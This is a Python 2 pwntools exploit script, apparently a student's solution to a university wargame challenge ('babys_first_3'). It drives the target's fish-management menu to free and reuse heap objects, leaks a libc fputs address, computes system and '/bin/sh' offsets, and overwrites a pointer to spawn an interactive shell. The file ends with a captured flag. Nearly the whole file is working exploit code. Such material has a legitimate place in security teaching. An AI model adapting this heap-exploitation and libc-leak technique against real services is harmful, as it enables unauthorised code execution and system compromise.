#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./babys_first_3 --host wargames.6447.sec.edu.au --port 9003
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./babys_first_3')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'wargames.6447.sec.edu.au'
port = int(args.PORT or 9003)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x080487a0
'''.format(**locals())

'''
print io.recvuntil("exit")
io.sendline("1")    #add fish
print io.recvline()
io.sendline("2")    #create fish 2
print io.recvline()
io.sendline("0")
print io.recvline()
io.sendline("0")
print io.recvline()
payload1 = "A"*16   #0x8ac21b0
io.sendline(payload1) #garbage name
'''
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()
print io.recvuntil("exit")
io.sendline("1")    #add fish
print io.recvline()
io.sendline("0")    #create fish 0
print io.recvline()
io.sendline("2147483647")
print io.recvline()
io.sendline("2147483647")
print io.recvline()
payload1 = "a"*16
io.send(payload1) #garbage name

print io.recvuntil("exit")
io.sendline("4")    #select to delete fish 0
print io.recvline()
io.sendline("0")    #delete fish 0
print io.recvuntil("exit")
io.sendline("1") #select menu option
print io.recvline()
print io.recvline()
io.sendline("1") #add fish 1
print io.recvline()
io.sendline("2147483647") #add size
print io.recvline()
io.sendline("2147483647") #add weight
print io.recvline()
#payload2 = "aa"+p32(0xf7e7d0d0)*8+p32(0x080486c0)+"12345678"
#payload2 = "a"*38+p32(0x080486c0)+"b"*8
payload2 = ""

#payload2 = "aaaabbbb"+p32(0xf7dfd200)+p32(0xffffdc8a)
io.sendline(payload2)
print io.recvuntil("exit")
io.sendline("3")
print io.recvline()
io.sendline("1")
io.recvline()
io.recvline()
#d1 04 08 ff ff ff 7f 70 65 e2 f7 70 d1 04 08 20
raw_output = io.recvline()
#print raw_output
address = ''.join(x.encode('hex') for x in raw_output[7:11][::-1])
#print address
address = int(address,16)
print address
fputs = 0x05ed60
bin_sh = 0x15f60f
system = 0x03b020
print fputs
print bin_sh
print system
#difference = fputs - system;
#print "diff: ",difference
print io.recvuntil("exit")
io.sendline("4")    #select to delete fish 0
print io.recvline()
io.sendline("1")    #delete fish 1
print io.recvuntil("exit")
io.sendline("1") #select menu option
print io.recvline()
print io.recvline()
io.sendline("2") #add fish 2
print io.recvline()
io.sendline("2147483647") #add size
print io.recvline()
io.sendline("2147483647") #add weight
print io.recvline()
payload3 = 'a'*8+p32(address - fputs + system) + p32(address - fputs + bin_sh)
io.sendline(payload3)

io.interactive()
#6447{401cb70c-1032-4ffe-8230-f0bbf81e8370}
